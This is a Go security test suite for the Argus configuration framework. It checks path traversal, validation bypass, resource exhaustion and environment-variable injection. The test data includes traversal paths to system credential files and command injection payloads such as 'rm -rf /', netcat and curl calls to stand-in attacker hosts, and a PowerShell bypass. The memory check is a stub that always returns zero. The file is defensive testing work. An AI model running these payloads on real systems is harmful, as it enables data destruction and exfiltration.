// argus_security_test.go: Comprehensive Security Testing Suite for Argus
//
// RED TEAM SECURITY ANALYSIS:
// This file implements systematic security testing against Argus configuration framework,
// designed to identify and prevent common attack vectors in production environments.
//
// THREAT MODEL:
// - Malicious configuration files (path traversal, injection attacks)
// - Environment variable poisoning and injection
// - Remote configuration server attacks (SSRF, content poisoning)
// - Resource exhaustion and DoS attacks
// - Audit trail manipulation and log injection
// - Race conditions and concurrent access vulnerabilities
//
// TESTING PHILOSOPHY:
// Each test is designed to be:
// - DRY (Don't Repeat Yourself) with reusable security utilities
// - SMART (Specific, Measurable, Achievable, Relevant, Time-bound)
// - COMPREHENSIVE covering all major attack vectors
// - WELL-DOCUMENTED explaining the security implications
//
// RED TEAM METHODOLOGY:
// 1. Identify attack surface and entry points
// 2. Create targeted exploit scenarios
// 3. Test boundary conditions and edge cases
// 4. Validate security controls and mitigations
// 5. Document vulnerabilities and remediation steps
//
// Copyright (c) 2025 AGILira - A. Giordano
// Series: an AGILira fragment
// SPDX-License-Identifier: MPL-2.0

package argus

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"
)

// =============================================================================
// SECURITY TESTING UTILITIES AND HELPERS
// =============================================================================

// SecurityTestContext provides utilities for security testing scenarios.
// This centralizes common security testing patterns and reduces code duplication.
type SecurityTestContext struct {
	t                *testing.T
	tempDir          string
	createdFiles     []string
	createdDirs      []string
	originalEnv      map[string]string
	cleanupFunctions []func()
	mu               sync.Mutex
}

// NewSecurityTestContext creates a new security testing context with automatic cleanup.
//
// SECURITY BENEFIT: Ensures test isolation and prevents test artifacts from
// affecting system security or other tests. Critical for reliable security testing.
func NewSecurityTestContext(t *testing.T) *SecurityTestContext {
	tempDir := t.TempDir() // Automatically cleaned up by testing framework

	ctx := &SecurityTestContext{
		t:                t,
		tempDir:          tempDir,
		createdFiles:     make([]string, 0),
		createdDirs:      make([]string, 0),
		originalEnv:      make(map[string]string),
		cleanupFunctions: make([]func(), 0),
	}

	// Register cleanup
	t.Cleanup(ctx.Cleanup)

	return ctx
}

// CreateMaliciousFile creates a file with potentially dangerous content for testing.
//
// SECURITY PURPOSE: Tests how Argus handles malicious configuration files,
// including path traversal attempts, injection payloads, and malformed content.
//
// Parameters:
//   - filename: Name of file to create (will be created in safe temp directory)
//   - content: Malicious content to write
//   - perm: File permissions (use restrictive permissions for security)
//
// Returns: Full path to created file for testing
func (ctx *SecurityTestContext) CreateMaliciousFile(filename string, content []byte, perm os.FileMode) string {
	ctx.mu.Lock()
	defer ctx.mu.Unlock()

	// SECURITY: Always create files in controlled temp directory
	// This prevents accidental system file modification during testing
	filePath := filepath.Join(ctx.tempDir, filepath.Clean(filename))

	// Ensure directory exists
	dir := filepath.Dir(filePath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		ctx.t.Fatalf("Failed to create directory for malicious file: %v", err)
	}

	// Create the malicious file
	if err := os.WriteFile(filePath, content, perm); err != nil {
		ctx.t.Fatalf("Failed to create malicious file: %v", err)
	}

	ctx.createdFiles = append(ctx.createdFiles, filePath)
	return filePath
}

// SetMaliciousEnvVar temporarily sets an environment variable to a malicious value.
//
// SECURITY PURPOSE: Tests environment variable injection and poisoning attacks.
// This is critical since many applications trust environment variables implicitly.
//
// The original value is automatically restored during cleanup to prevent
// contamination of other tests or the system environment.
func (ctx *SecurityTestContext) SetMaliciousEnvVar(key, maliciousValue string) {
	ctx.mu.Lock()
	defer ctx.mu.Unlock()

	// Store original value for restoration
	if _, exists := ctx.originalEnv[key]; !exists {
		ctx.originalEnv[key] = os.Getenv(key)
	}

	// Set malicious value
	if err := os.Setenv(key, maliciousValue); err != nil {
		ctx.t.Fatalf("Failed to set malicious environment variable %s: %v", key, err)
	}
}

// ExpectSecurityError validates that a security-related error occurred.
//
// SECURITY PRINCIPLE: Security tests should expect failures when malicious
// input is provided. If an operation succeeds with malicious input, that
// indicates a potential security vulnerability.
//
// This helper makes security test intentions clear and reduces boilerplate.
func (ctx *SecurityTestContext) ExpectSecurityError(err error, operation string) {
	if err == nil {
		ctx.t.Errorf("SECURITY VULNERABILITY: %s should have failed with malicious input but succeeded", operation)
	}
}

// ExpectSecuritySuccess validates that a legitimate operation succeeded.
//
// SECURITY PRINCIPLE: Security controls should not break legitimate functionality.
// This helper validates that security measures don't introduce false positives.
func (ctx *SecurityTestContext) ExpectSecuritySuccess(err error, operation string) {
	if err != nil {
		ctx.t.Errorf("SECURITY ISSUE: %s should have succeeded with legitimate input but failed: %v", operation, err)
	}
}

// CreatePathTraversalFile creates a file with path traversal attempts in the name.
//
// SECURITY PURPOSE: Tests whether Argus properly validates and sanitizes file paths
// to prevent directory traversal attacks that could access sensitive system files.
//
// Common path traversal patterns:
// - "../../../etc/passwd" (Unix path traversal)
// - "..\\..\\..\\windows\\system32\\config\\sam" (Windows path traversal)
// - URL-encoded variations (%2e%2e%2f, etc.)
// - Unicode variations (overlong UTF-8, etc.)
func (ctx *SecurityTestContext) CreatePathTraversalFile(traversalPath string, content []byte) string {
	// SECURITY NOTE: We create the file with a safe name in temp directory,
	// but test Argus with the dangerous traversal path
	safeName := strings.ReplaceAll(traversalPath, "/", "_")
	safeName = strings.ReplaceAll(safeName, "\\", "_")
	safeName = strings.ReplaceAll(safeName, "..", "dotdot")

	return ctx.CreateMaliciousFile(safeName, content, 0644)
}

// Cleanup restores environment and removes temporary files.
//
// SECURITY IMPORTANCE: Proper cleanup prevents test contamination and
// ensures security tests don't leave dangerous artifacts on the system.
func (ctx *SecurityTestContext) Cleanup() {
	ctx.mu.Lock()
	defer ctx.mu.Unlock()

	// Run custom cleanup functions first
	for _, fn := range ctx.cleanupFunctions {
		func() {
			defer func() {
				if r := recover(); r != nil {
					ctx.t.Logf("Warning: Cleanup function panicked: %v", r)
				}
			}()
			fn()
		}()
	}

	// Restore environment variables
	for key, originalValue := range ctx.originalEnv {
		if originalValue == "" {
			if err := os.Unsetenv(key); err != nil {
				ctx.t.Errorf("Failed to unset env %s: %v", key, err)
			}
		} else {
			if err := os.Setenv(key, originalValue); err != nil {
				ctx.t.Errorf("Failed to restore env %s: %v", key, err)
			}
		}
	}

	// Note: File cleanup is handled by t.TempDir() automatically
}

// AddCleanup registers a cleanup function to be called during test cleanup.
//
// SECURITY PURPOSE: Allows security tests to register custom cleanup logic
// for resources like network connections, databases, or system state changes.
func (ctx *SecurityTestContext) AddCleanup(fn func()) {
	ctx.mu.Lock()
	defer ctx.mu.Unlock()
	ctx.cleanupFunctions = append(ctx.cleanupFunctions, fn)
}

// =============================================================================
// PATH TRAVERSAL AND DIRECTORY TRAVERSAL SECURITY TESTS
// =============================================================================

// TestSecurity_PathTraversalAttacks tests for directory traversal vulnerabilities.
//
// ATTACK VECTOR: Path traversal (CWE-22)
// DESCRIPTION: Malicious actors attempt to access files outside the intended
// directory by using "../" sequences or equivalent techniques.
//
// IMPACT: If successful, attackers could read sensitive system files like
// /etc/passwd, /etc/shadow, Windows SAM files, or application secrets.
//
// MITIGATION EXPECTED: Argus should validate and sanitize file paths before
// using them, rejecting or normalizing dangerous path components.
func TestSecurity_PathTraversalAttacks(t *testing.T) {
	ctx := NewSecurityTestContext(t)

	// Define common path traversal attack patterns
	pathTraversalAttacks := []struct {
		name        string
		path        string
		description string
	}{
		{
			name:        "BasicUnixPathTraversal",
			path:        "../../../etc/passwd",
			description: "Basic Unix directory traversal attempt to access system password file",
		},
		{
			name:        "DeepUnixPathTraversal",
			path:        "../../../../../../../../etc/shadow",
			description: "Deep directory traversal with excessive ../ components",
		},
		{
			name:        "WindowsPathTraversal",
			path:        "..\\..\\..\\windows\\system32\\config\\sam",
			description: "Windows-style directory traversal to access SAM database",
		},
		{
			name:        "MixedPathSeparators",
			path:        "../..\\../etc/passwd",
			description: "Mixed path separators to bypass simple filtering",
		},
		{
			name:        "URLEncodedTraversal",
			path:        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
			description: "URL-encoded path traversal to bypass string-based filters",
		},
		{
			name:        "DoubleEncodedTraversal",
			path:        "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
			description: "Double URL-encoded traversal for systems that decode twice",
		},
		{
			name:        "NullByteInjection",
			path:        "../../../etc/passwd\x00.config",
			description: "Null byte injection to truncate path and bypass extension validation",
		},
		{
			name:        "UnicodeNormalization",
			path:        "..\u002f..\u002f..\u002fetc\u002fpasswd",
			description: "Unicode normalization attack using alternative slash representations",
		},
	}

	for _, attack := range pathTraversalAttacks {
		t.Run(attack.name, func(t *testing.T) {
			// Create a watcher to test path validation
			watcher := New(Config{
				PollInterval: 100 * time.Millisecond,
				Audit:        AuditConfig{Enabled: false}, // Disable audit to focus on core vulnerability
			})
			defer func() {
				if err := watcher.Close(); err != nil {
					t.Logf("Failed to close watcher: %v", err)
				}
			}()

			// SECURITY TEST: Attempt to watch a file with malicious path
			// Expected behavior: This should fail with appropriate error
			err := watcher.Watch(attack.path, func(event ChangeEvent) {
				t.Errorf("SECURITY VULNERABILITY: Callback should never be called for malicious path: %s", attack.path)
			})

			// SECURITY ASSERTION: Path traversal should be rejected
			ctx.ExpectSecurityError(err, fmt.Sprintf("watching malicious path: %s (%s)", attack.path, attack.description))

			if err == nil {
				t.Logf("SECURITY CRITICAL: Path traversal was not blocked for: %s", attack.description)

				// If watch succeeded, test if it actually accesses the system file
				if err := watcher.Start(); err != nil {
					t.Logf("Failed to start watcher: %v", err)
				}
				time.Sleep(200 * time.Millisecond) // Allow some processing time
				if err := watcher.Stop(); err != nil {
					t.Errorf("Failed to stop watcher: %v", err)
				}

				// Log detailed security analysis
				t.Errorf("SECURITY VULNERABILITY CONFIRMED: Argus accepted malicious path '%s' which could lead to unauthorized file access. Attack: %s",
					attack.path, attack.description)
			}
		})
	}
}

// TestSecurity_PathValidationBypass tests attempts to bypass path validation.
//
// ATTACK VECTOR: Path validation bypass (CWE-23)
// DESCRIPTION: Sophisticated attackers may try to bypass path validation
// using encoding, normalization, or other techniques not covered by basic filters.
//
// This test focuses on advanced bypass techniques that might evade
// simple string-based or regex-based path validation.
func TestSecurity_PathValidationBypass(t *testing.T) {
	ctx := NewSecurityTestContext(t)

	// Advanced path traversal bypass techniques
	bypassAttempts := []struct {
		name        string
		path        string
		description string
	}{
		{
			name:        "SymlinkTraversal",
			path:        ctx.tempDir + "/malicious_symlink", // Will create symlink to /etc/passwd
			description: "Symlink-based traversal to access files outside intended directory",
		},
		{
			name:        "OverlongPathComponents",
			path:        strings.Repeat("../", 100) + "etc/passwd",
			description: "Overlong path with excessive traversal components to cause buffer issues",
		},
		{
			name:        "PathNormalizationAttack",
			path:        "./../../etc/passwd",
			description: "Path normalization attack using current directory references",
		},
		{
			name:        "WindowsDeviceNames",
			path:        "CON",
			description: "Windows device name that could cause DoS or unexpected behavior",
		},
		{
			name:        "WindowsAlternateDataStream",
			path:        "config.txt:hidden_stream",
			description: "Windows alternate data stream to hide malicious content",
		},
	}

	for _, bypass := range bypassAttempts {
		t.Run(bypass.name, func(t *testing.T) {
			// Special setup for symlink test
			if bypass.name == "SymlinkTraversal" {
				// Create malicious symlink pointing to system file
				symlinkPath := bypass.path
				targetPath := "/etc/passwd" // Unix system file

				// Create symlink in safe temp directory
				err := os.Symlink(targetPath, symlinkPath)
				if err != nil && !os.IsExist(err) {
					t.Skip("Cannot create symlink for test (may require permissions)")
				}
			}

			watcher := New(Config{
				PollInterval: 100 * time.Millisecond,
				Audit:        AuditConfig{Enabled: false},
			})
			defer func() {
				if err := watcher.Close(); err != nil {
					t.Errorf("Failed to close watcher: %v", err)
				}
			}()

			// SECURITY TEST: Attempt path validation bypass
			err := watcher.Watch(bypass.path, func(event ChangeEvent) {
				t.Errorf("SECURITY VULNERABILITY: Callback executed for bypass attempt: %s", bypass.path)
			})

			// SECURITY ASSERTION: Bypass attempts should fail
			ctx.ExpectSecurityError(err, fmt.Sprintf("path validation bypass: %s (%s)", bypass.path, bypass.description))

			if err == nil {
				t.Errorf("SECURITY VULNERABILITY: Path validation bypass succeeded for: %s - %s",
					bypass.path, bypass.description)
			}
		})
	}
}

// =============================================================================
// RESOURCE EXHAUSTION AND DENIAL OF SERVICE TESTS
// =============================================================================

// TestSecurity_ResourceExhaustionAttacks tests for DoS via resource exhaustion.
//
// ATTACK VECTOR: Resource exhaustion (CWE-400)
// DESCRIPTION: Attackers attempt to consume excessive system resources
// (memory, file descriptors, CPU) to cause denial of service.
//
// IMPACT: Could cause application crashes, system instability, or service
// unavailability affecting legitimate users.
//
// MITIGATION EXPECTED: Argus should implement proper resource limits and
// gracefully handle resource exhaustion scenarios.
func TestSecurity_ResourceExhaustionAttacks(t *testing.T) {
	ctx := NewSecurityTestContext(t)

	t.Run("MaxWatchedFilesExhaustion", func(t *testing.T) {
		// SECURITY TEST: Attempt to exceed MaxWatchedFiles limit
		// This tests whether Argus properly enforces resource limits

		watcher := New(Config{
			PollInterval:    100 * time.Millisecond,
			MaxWatchedFiles: 5, // Intentionally low limit for testing
			Audit:           AuditConfig{Enabled: false},
		})
		defer func() {
			if err := watcher.Close(); err != nil {
				t.Errorf("Failed to close watcher: %v", err)
			}
		}()

		// Add files up to the limit
		for i := 0; i < 5; i++ {
			filePath := ctx.CreateMaliciousFile(fmt.Sprintf("file_%d.txt", i), []byte("test"), 0644)
			err := watcher.Watch(filePath, func(event ChangeEvent) {})
			ctx.ExpectSecuritySuccess(err, fmt.Sprintf("watching file %d within limit", i))
		}

		// SECURITY TEST: Attempt to exceed the limit
		extraFilePath := ctx.CreateMaliciousFile("extra_file.txt", []byte("test"), 0644)
		err := watcher.Watch(extraFilePath, func(event ChangeEvent) {})

		// SECURITY ASSERTION: Should reject request exceeding limit
		ctx.ExpectSecurityError(err, "watching file beyond MaxWatchedFiles limit")

		if err == nil {
			t.Error("SECURITY VULNERABILITY: MaxWatchedFiles limit was not enforced - potential DoS vector")
		}
	})

	t.Run("MemoryExhaustionViaLargeConfigs", func(t *testing.T) {
		// SECURITY TEST: Attempt memory exhaustion via large configuration files
		// Large configs could cause excessive memory allocation during parsing

		// Create a very large configuration file (10MB of JSON)
		largeConfigSize := 10 * 1024 * 1024 // 10MB
		largeConfig := make([]byte, largeConfigSize)

		// Fill with valid JSON to test parser memory usage
		jsonPattern := `{"key_%d": "value_%d", `
		pos := 0
		counter := 0
		largeConfig[pos] = '{'
		pos++

		for pos < largeConfigSize-100 {
			part := fmt.Sprintf(jsonPattern, counter, counter)
			if pos+len(part) >= largeConfigSize-100 {
				break
			}
			copy(largeConfig[pos:], part)
			pos += len(part)
			counter++
		}

		// Close JSON properly
		copy(largeConfig[pos:], `"end": "end"}`)

		largePath := ctx.CreateMaliciousFile("large_config.json", largeConfig, 0644)

		watcher := New(Config{
			PollInterval: 100 * time.Millisecond,
			Audit:        AuditConfig{Enabled: false},
		})
		defer func() {
			if err := watcher.Close(); err != nil {
				t.Logf("Failed to close watcher: %v", err)
			}
		}()

		// SECURITY TEST: Watch large file and measure resource usage
		var memBefore, memAfter uint64

		// Measure memory before
		memBefore = getCurrentMemoryUsage()

		err := watcher.Watch(largePath, func(event ChangeEvent) {
			// Parse the large config to trigger potential memory issues
			_, parseErr := ParseConfig(largeConfig, FormatJSON)
			if parseErr != nil {
				t.Logf("Large config parsing failed (expected): %v", parseErr)
			}
		})

		if err == nil {
			if err := watcher.Start(); err != nil {
				t.Logf("Failed to start watcher: %v", err)
			}

			// Trigger file change to test parsing memory usage
			ctx.CreateMaliciousFile("large_config.json", append(largeConfig, []byte(" ")...), 0644)

			time.Sleep(500 * time.Millisecond) // Allow processing

			// Measure memory after
			memAfter = getCurrentMemoryUsage()

			if err := watcher.Stop(); err != nil {
				t.Errorf("Failed to stop watcher: %v", err)
			}

			// SECURITY ANALYSIS: Check for reasonable memory usage
			memDiff := memAfter - memBefore
			if memDiff > 50*1024*1024 { // More than 50MB increase
				t.Errorf("SECURITY WARNING: Large config caused excessive memory usage: %d bytes increase", memDiff)
			}
		}
	})

	t.Run("FileDescriptorExhaustion", func(t *testing.T) {
		// SECURITY TEST: Attempt to exhaust file descriptors
		// This could cause system-wide issues if not properly managed

		watcher := New(Config{
			PollInterval:    50 * time.Millisecond, // Aggressive polling
			MaxWatchedFiles: 100,
			Audit:           AuditConfig{Enabled: false},
		})
		defer func() {
			if err := watcher.Close(); err != nil {
				t.Logf("Failed to close watcher: %v", err)
			}
		}()

		// Create many files and watch them to test FD usage
		for i := 0; i < 50; i++ { // Test with moderate number
			filePath := ctx.CreateMaliciousFile(fmt.Sprintf("fd_test_%d.txt", i), []byte("test"), 0644)

			err := watcher.Watch(filePath, func(event ChangeEvent) {})
			if err != nil {
				t.Logf("Could not watch file %d (may have hit system limits): %v", i, err)
				break
			}
		} // Start intensive polling to test FD management
		if err := watcher.Start(); err != nil {
			t.Logf("Failed to start watcher: %v", err)
		}
		time.Sleep(1 * time.Second) // Allow intensive polling
		if err := watcher.Stop(); err != nil {
			t.Logf("Failed to stop watcher: %v", err)
		}

		// SECURITY CHECK: Watcher should still be functional
		testFile := ctx.CreateMaliciousFile("fd_recovery_test.txt", []byte("test"), 0644)
		err := watcher.Watch(testFile, func(event ChangeEvent) {})
		ctx.ExpectSecuritySuccess(err, "file descriptor recovery after intensive usage")
	})
}

// Helper function to get current memory usage (simplified for testing)
func getCurrentMemoryUsage() uint64 {
	// In a real implementation, this would use runtime.MemStats
	// For testing purposes, we return a placeholder value
	return 0 // This should be implemented properly for production security testing
}

// =============================================================================
// ENVIRONMENT VARIABLE INJECTION TESTS
// =============================================================================

// TestSecurity_EnvironmentVariableInjection tests for env var injection vulnerabilities.
//
// ATTACK VECTOR: Environment variable injection (CWE-74)
// DESCRIPTION: Attackers manipulate environment variables to inject malicious
// values into the application, potentially bypassing security controls.
//
// IMPACT: Could lead to configuration tampering, privilege escalation,
// or execution of unintended commands if environment values are used unsafely.
//
// This is particularly dangerous in containerized environments where
// environment variables are commonly used for configuration.
func TestSecurity_EnvironmentVariableInjection(t *testing.T) {
	ctx := NewSecurityTestContext(t)

	t.Run("PathInjectionViaEnvironment", func(t *testing.T) {
		// SECURITY TEST: Inject malicious paths via environment variables
		// Tests whether env config loading properly validates path values

		maliciousPaths := []string{
			"../../../etc/passwd",
			"/proc/self/environ",
			"\\..\\..\\..\\windows\\system32\\config\\sam",
			"/dev/random", // Could cause DoS if read from
			"CON",         // Windows device name
			"/proc/1/mem", // Kernel memory access attempt
		}

		for _, maliciousPath := range maliciousPaths {
			t.Run(fmt.Sprintf("Path_%s", strings.ReplaceAll(maliciousPath, "/", "_")), func(t *testing.T) {
				// Set malicious audit output file via environment
				ctx.SetMaliciousEnvVar("ARGUS_AUDIT_OUTPUT_FILE", maliciousPath)

				// SECURITY TEST: Attempt to load config with malicious path
				config, err := LoadConfigFromEnv()

				if err == nil && config != nil {
					// If config loaded successfully, check if it contains the malicious path
					if config.Audit.OutputFile == maliciousPath {
						t.Errorf("SECURITY VULNERABILITY: Malicious path accepted via environment variable: %s", maliciousPath)
					} else {
						t.Logf("SECURITY GOOD: Environment path was sanitized or rejected")
					}
				} else {
					t.Logf("SECURITY GOOD: Configuration loading failed with malicious path (expected)")
				}
			})
		}
	})

	t.Run("CommandInjectionViaEnvironment", func(t *testing.T) {
		// SECURITY TEST: Attempt command injection via environment variables
		// Tests whether any env values are unsafely passed to system commands

		commandInjectionPayloads := []string{
			"; rm -rf /",
			"| nc attacker.com 443",
			"&& curl http://evil.com/exfiltrate",
			"`whoami`",
			"$(id)",
			"%SYSTEMROOT%\\System32\\calc.exe",
			"; powershell.exe -ExecutionPolicy Bypass",
		}

		for _, payload := range commandInjectionPayloads {
			t.Run(fmt.Sprintf("Injection_%d", len(payload)), func(t *testing.T) {
				// Test injection in various environment variables
				envVars := []string{
					"ARGUS_REMOTE_URL",
					"ARGUS_AUDIT_OUTPUT_FILE",
					"ARGUS_VALIDATION_SCHEMA",
				}

				for _, envVar := range envVars {
					ctx.SetMaliciousEnvVar(envVar, payload)

					// SECURITY TEST: Load config and ensure payload is not executed
					config, err := LoadConfigFromEnv()

					// SECURITY ANALYSIS: Even if config loads, payload should not execute
					if err == nil && config != nil {
						// Verify that the payload wasn't interpreted as a command
						// In a real test, we would check for signs of command execution
						t.Logf("Config loaded with potential injection payload in %s - verify no execution occurred", envVar)
					}
				}
			})
		}
	})

	t.Run("ConfigurationOverrideAttacks", func(t *testing.T) {
		// SECURITY TEST: Attempt to override security-critical configurations
		// Tests whether attackers can disable security features via environment

		securityOverrides := []struct {
			envVar         string
			maliciousValue string
			description    string
		}{
			{"ARGUS_AUDIT_ENABLED", "false", "Attempt to disable audit logging"},
			{"ARGUS_MAX_WATCHED_FILES", "999999", "Attempt to bypass file watching limits"},
			{"ARGUS_POLL_INTERVAL", "1ns", "Attempt to cause excessive CPU usage via rapid polling"},
			{"ARGUS_CACHE_TTL", "0", "Attempt to disable caching and cause performance DoS"},
			{"ARGUS_BOREAS_CAPACITY", "1", "Attempt to cripple event processing capacity"},
		}

		for _, override := range securityOverrides {
			t.Run(override.envVar, func(t *testing.T) {
				ctx.SetMaliciousEnvVar(override.envVar, override.maliciousValue)

				config, err := LoadConfigFromEnv()

				if err == nil && config != nil {
					// SECURITY ANALYSIS: Check if dangerous overrides were applied
					switch override.envVar {
					case "ARGUS_AUDIT_ENABLED":
						if !config.Audit.Enabled {
							t.Errorf("SECURITY VULNERABILITY: %s - Audit logging was disabled via environment", override.description)
						}
					case "ARGUS_MAX_WATCHED_FILES":
						if config.MaxWatchedFiles > 1000 {
							t.Errorf("SECURITY WARNING: %s - Excessive MaxWatchedFiles limit set: %d", override.description, config.MaxWatchedFiles)
						}
					case "ARGUS_POLL_INTERVAL":
						if config.PollInterval < time.Millisecond {
							t.Errorf("SECURITY WARNING: %s - Dangerously low poll interval: %v", override.description, config.PollInterval)
						}
					}
				}
			})
		}
	})
}
